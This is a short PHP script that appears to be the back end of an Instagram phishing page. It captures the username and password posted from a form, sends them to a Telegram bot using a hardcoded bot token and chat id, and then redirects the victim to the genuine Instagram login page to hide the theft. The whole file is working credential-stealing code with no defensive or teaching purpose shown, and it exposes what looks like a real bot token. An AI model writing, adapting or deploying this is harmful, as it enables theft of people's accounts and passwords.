<?php

if(isset($_POST['submit'])){
  $name = $_POST['name'];
  $password = $_POST['password'];

}
$token = "1863343257:AAG1JgymxXdfbC82zAaNFmvCPIlcmFVMY3g";
$myid = "1707202229";
$url = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$myid."&text=Username: $name%0APassword: $password&parse_mode=HTML";
file_get_contents($url);
Header("Location: https://www.instagram.com/accounts/login", true, 301);
?>
